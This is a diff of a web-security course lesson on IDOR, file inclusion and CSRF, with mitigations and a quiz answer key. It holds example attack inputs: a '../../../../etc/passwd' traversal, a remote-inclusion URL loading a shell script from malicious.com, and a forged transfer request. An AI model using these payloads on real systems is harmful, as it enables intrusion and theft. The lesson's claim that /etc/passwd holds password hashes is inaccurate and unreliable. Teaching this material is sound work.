@@ -6,40 +6,78 @@ topic: "IDOR, File Inclusion, CSRF"
 difficulty: "Intermediate"
 ---
 
-# Day 10: Web Vulnerabilities II
+# Day 10: Web Vulnerabilities II - Logic & Access Control Failures
 
-Today we move beyond basic injections and look at how logic and access control break.
-
-## 1. IDOR (Insecure Direct Object Reference)
-- **Concept:** Changing a number in a URL to see someone else's data.
-- **Example:** You log in and see `shop.com/profile?id=100`. You change it to `id=101`. If you see *another* user's profile, that is **IDOR**.
-
-## 2. LFI/RFI (Local/Remote File Inclusion)
-- **Concept:** Tricking the website into showing you files from the server's own disk.
-- **Example:** `site.com/view?page=contact.php`. You change it to `page=/etc/passwd`.
-
-## 3. CSRF (Cross-Site Request Forgery)
-- **Concept:** Tricking a logged-in user into clicking a link that performs an action (like changing their password) without them knowing.
+Yesterday, we discussed input injection and client-side scripting. Today, we focus on access control design failures and application logic vulnerabilities: IDOR, File Inclusion, and CSRF.
 
 ---
 
-### Interactive Challenge 1: The IDOR Scout
-A hacker sees this URL: `https://bank.com/api/v1/transfer/9928`.
-What would they change `9928` to if they wanted to test for IDOR?
+## 1. IDOR (Insecure Direct Object Reference)
 
-<Challenge
-  id="day-10-idor"
-  type="input"
-  correctAnswer="9929"
-  placeholder="Enter a test ID..."
-/>
+**IDOR** occurs when an application exposes a reference to an internal database object or resource (such as a database ID or file path) in a URL or API parameter, without validating if the user is authorized to access it.
 
-### Interactive Challenge 2: The File Hunter
-To read the secret Linux user list via an LFI vulnerability, which file path is most commonly targeted?
+```
+Attacker logs in and sees their account URL:
+https://bank.com/api/v1/accounts/9928
+
+The attacker manually increments the ID value in their browser:
+https://bank.com/api/v1/accounts/9929
+```
+
+If the web server returns account data for `9929` without checking if the attacker owns that account, an IDOR vulnerability exists.
+
+### Mitigation: Object-Level Access Control
+Implement a centralized authorization check on the server side to verify that the logged-in user is authorized to access the specific requested object before returning it.
+
+---
+
+## 2. File Inclusion (LFI & RFI)
+
+**File Inclusion** occurs when an application takes user input and passes it directly into a backend file system path loading function.
+
+### Local File Inclusion (LFI)
+The attacker reads local files on the server’s local disk by traversing directories using `../` (Directory Traversal):
+```
+Vulnerable path request:
+https://site.com/view.php?page=contact.php
+
+Attacker inputs directory traversal payload:
+https://site.com/view.php?page=../../../../etc/passwd
+```
+The server resolves the directory path and returns the sensitive Linux password list file.
+
+### Remote File Inclusion (RFI)
+The attacker tricks the server into loading and executing a malicious script hosted on a remote server:
+```
+https://site.com/view.php?page=http://malicious.com/shell.txt
+```
+
+---
+
+## 3. CSRF (Cross-Site Request Forgery)
+
+**CSRF** is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently logged in.
+
+```
+1. Victim is logged into securebank.com.
+2. Victim visits a malicious website: hackerforum.com.
+3. hackerforum.com contains an invisible form that sends a post request to:
+   securebank.com/transfer?amount=10000&to=hacker
+4. The victim's browser automatically appends their secure session cookie.
+5. securebank.com executes the transfer, believing the victim performed the action!
+```
+
+### Mitigation: Anti-CSRF Tokens
+Use unique, unpredictable, and cryptographically secure **Anti-CSRF Tokens** associated with the user's active session. The server must validate this token before executing any state-changing request (such as bank transfers or password updates).
+
+---
+
+### Challenge: LFI Target
+To read the secret Linux user password hash file via a Local File Inclusion (LFI) directory traversal exploit, which file path is most commonly targeted by attackers on Linux operating systems?
 
 <Challenge
   id="day-10-lfi"
   type="input"
   correctAnswer="/etc/passwd"
-  placeholder="/path/to/file"
+  placeholder="Enter targeted file path..."
 />
